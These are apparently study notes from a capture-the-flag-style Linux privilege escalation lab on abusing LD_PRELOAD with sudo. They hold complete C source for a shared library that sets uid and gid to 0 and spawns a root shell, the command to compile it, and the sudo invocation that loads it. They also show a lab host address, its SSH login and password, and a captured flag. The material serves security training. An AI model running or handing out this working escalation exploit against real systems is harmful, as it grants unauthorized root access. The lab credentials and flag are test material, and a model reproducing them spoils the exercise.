# Shared Libraries

2 types of libraries exist in Linux:

- static libraries (denoted by the .a file extension)
- dynamically linked shared object libraries (denoted by the .so file extension).

LD_PRELOAD environment variable can load a library before executing a binary

1) View shared objects required by a binary 

ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)

2) LD_PRELOAD Privilege Escalation : required a user with sudo privilege

sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

3) Create a custom shared library

vi root.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

4) Compile the library

gcc -fPIC -shared -o root.so root.c -nostartfiles

5) Escalate privileges

sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)

## LAB

ssh htb-student@10.129.220.117
Academy_LLPE!

ldd /bin/ls
	linux-vdso.so.1 =>  (0x00007ffd07342000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f50bb6a6000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f50bb2dc000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f50bb06c000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f50bae68000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f50bb8c8000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f50bac4b000)

sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl

vi root.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o root.so root.c -nostartfiles

sudo LD_PRELOAD=/home/htb-student/root.so /usr/bin/openssl restart
root@NIX02:~# cat /root/ld_preload/flag.txt
6a9c151a599135618b8f09adc78ab5f1

